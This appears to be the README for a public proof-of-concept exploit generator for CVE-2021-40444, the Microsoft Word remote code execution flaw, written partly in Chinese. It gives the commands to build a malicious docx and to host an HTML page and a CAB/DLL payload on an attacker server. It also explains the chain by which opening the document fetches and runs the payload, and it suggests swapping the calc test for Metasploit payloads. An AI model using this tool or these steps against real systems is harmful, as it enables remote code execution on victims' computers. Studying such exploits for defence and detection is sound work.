# CVE-2021-40444 PoC

Malicious docx generator to exploit CVE-2021-40444 (Microsoft Office Word Remote Code Execution)

Creation of this Script is based on some reverse engineering over the sample used in-the-wild: 938545f7bbe40738908a95da8cdeabb2a11ce2ca36b0f6a74deda9378d380a52 (docx file)

需要安装 lcab 依赖包  (`sudo apt-get install lcab`)

Check `REPRODUCE.md` for manual reproduce steps

If your generated cab is not working, try pointing out exploit.html URL to calc.cab

# Using

首先使用exploit.py在out/文件夹内生成一个恶意docx文档(名称为document.docx)在srv/文件夹内生成一个恶意html(名称为word.html)和一个cab格式的payload(名称为word.cab，需要由dll类型的payload生成，可以使用预置的测试payload `test/calc.dll`弹出计算器，或使用msf生成其他类型的dll payload) 。

`python3 exploit.py generate test/calc.dll http://<SRV IP>`


![Document generation](./img/gen.png)

一旦你生成了恶意docx文档 (will be at `out/`) 你可以启动一个web server（根目录是srv/）:

`sudo python3 exploit.py host 80`

![Server](./img/srv.png)

Finally try the docx in a Windows Virtual Machine:

![Pop Calc](./img/calc.png)

利用链条：
本地执行document.docx会从`http://<SRV IP>/word.html`加载srv/word.html，然后word.html将加载srv/word.cab并执行
